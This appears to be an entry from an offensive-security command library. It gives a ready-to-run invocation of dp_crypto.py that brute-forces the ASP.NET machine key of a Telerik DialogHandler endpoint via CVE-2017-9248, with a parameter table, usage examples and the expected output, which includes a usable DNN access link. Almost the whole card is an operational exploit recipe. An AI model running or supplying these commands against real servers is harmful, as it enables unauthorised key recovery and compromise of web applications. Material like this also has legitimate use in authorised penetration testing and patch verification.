---
id: cmd-uuid-1
data: >-
  python dp_crypto.py -k
  https://target/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx
  88 all 21
tags:
  - brute-force
  - telerik
type: command
output: 'null'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:28.478Z'
verified: false
validated: true
submitted: true
---
# dp-crypto-brute-force-machine-key

## Command

```bash
python dp_crypto.py -k https://target/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 88 all 21
```

## Description

This command executes the dp_crypto Python script to brute-force the ASP.NET machine key from a vulnerable Telerik DialogHandler endpoint, using multi-threading for efficiency in exploiting CVE-2017-9248.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Target URL of the DialogHandler endpoint | Yes |
| `88` | Key length in characters | Yes |
| `all` | Character set (full ASCII printable) | Yes |
| `21` | Number of threads for parallel brute-forcing | Yes |

## Examples

### Basic Usage

```bash
python dp_crypto.py -k https://example.com/DialogHandler.aspx 88 all 21
```

### Advanced Usage

For longer keys to detect repetition:

```bash
python dp_crypto.py -k https://example.com/DialogHandler.aspx 128 all 21
```

## Expected Output

The script outputs the recovered machine key as a string, often integrated into a base64-encoded link for DNN access. Example: "Machine Key: ABC123... (88 chars)" followed by the usable URL. Key repetition is evident in extended runs.

## Related

- [[procedures/Brute-Force-ASP-NET-Machine-Key-Using-dp-crypto]]
- [[tools/dp-crypto]]
